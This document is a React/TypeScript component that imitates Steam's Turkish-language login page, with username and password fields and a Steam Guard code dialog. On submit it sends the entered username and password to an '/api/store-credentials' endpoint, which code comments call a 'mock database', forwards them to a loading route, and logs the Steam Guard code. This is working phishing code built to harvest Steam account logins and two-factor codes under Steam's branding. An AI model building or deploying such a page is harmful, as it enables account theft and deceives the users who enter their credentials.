
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { toast } from 'sonner';
import { ArrowRight, Loader } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Progress } from "@/components/ui/progress";

const SteamLoginForm = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showSteamGuard, setShowSteamGuard] = useState(false);
  const [steamGuardCode, setSteamGuardCode] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast.error("Lütfen tüm gerekli alanları doldurun");
      return;
    }
    setIsLoading(true);

    // Send to mock database
    try {
      // API call to add the credentials to our mock database
      await fetch('/api/store-credentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });
      
      // Navigate to the loading page
      navigate('/loading', { state: { username, password } });
    } catch (error) {
      setIsLoading(false);
      toast.error("Bir hata oluştu. Lütfen tekrar deneyin.");
    }
  };

  const handleSteamGuardSubmit = () => {
    console.log('Steam Guard Code submitted:', steamGuardCode);
    setShowSteamGuard(false);
    toast.success("Giriş başarılı! Yönlendiriliyorsunuz...");
    
    // Simulate redirect to Steam homepage after successful login
    setTimeout(() => {
      navigate('/');
    }, 1500);
  };

  return (
    <div className="w-full max-w-md mx-auto">
      <div className="mb-6 text-center">
        <h1 className="text-lg font-medium text-white mb-2">
          HESABINIZA GİRİŞ YAPIN
        </h1>
      </div>
      
      <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
        <div className="space-y-1">
          <label className="text-xs font-medium text-white/50 uppercase">
            STEAM HESABI ADI
          </label>
          <Input 
            placeholder="" 
            value={username} 
            onChange={e => setUsername(e.target.value)} 
            className="bg-[#32353c] border-0 h-10 text-white" 
            required 
            disabled={isLoading}
          />
        </div>
        
        <div className="space-y-1">
          <label className="text-xs font-medium text-white/50 uppercase">
            PAROLA
          </label>
          <Input 
            type="password" 
            value={password} 
            onChange={e => setPassword(e.target.value)} 
            className="bg-[#32353c] border-0 h-10 text-white" 
            required 
            disabled={isLoading}
          />
        </div>

        <div className="flex items-center space-x-2">
          <Checkbox 
            id="rememberMe" 
            checked={rememberMe} 
            onCheckedChange={checked => setRememberMe(checked === true)} 
            disabled={isLoading} 
            className="border-steam-gray data-[state=checked]:bg-blue-400"
          />
          <label 
            htmlFor="rememberMe" 
            className="text-xs font-medium text-white/80 cursor-pointer"
          >
            Beni hatırla
          </label>
        </div>
        
        <Button 
          type="submit" 
          disabled={isLoading} 
          className="h-10 bg-blue-400 hover:bg-blue-500 text-white w-full"
        >
          {isLoading ? (
            <>
              <Loader className="mr-2 h-4 w-4 animate-spin" />
              Giriş Yapılıyor...
            </>
          ) : (
            'Giriş Yap'
          )}
        </Button>
        
        <a href="#" className="text-center text-xs text-white/60 hover:text-white">
          Yardım edin, giriş yapamıyorum
        </a>
      </form>

      {/* Steam Guard Dialog */}
      <Dialog open={showSteamGuard} onOpenChange={setShowSteamGuard}>
        <DialogContent className="bg-[#171a21] border-[#32353c] text-white">
          <div className="p-4">
            <h2 className="text-xl font-bold mb-4">Steam Guard Doğrulama</h2>
            <p className="mb-4 text-white/70">E-posta adresinize gönderilen Steam Guard kodunu girin</p>
            
            <div className="mb-4">
              <Input
                className="bg-[#32353c] border-0 text-white"
                value={steamGuardCode}
                onChange={(e) => setSteamGuardCode(e.target.value)}
                placeholder="XXXXX"
                maxLength={5}
              />
            </div>
            
            <Button 
              onClick={handleSteamGuardSubmit}
              className="w-full bg-blue-400 hover:bg-blue-500"
            >
              Gönder
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default SteamLoginForm;
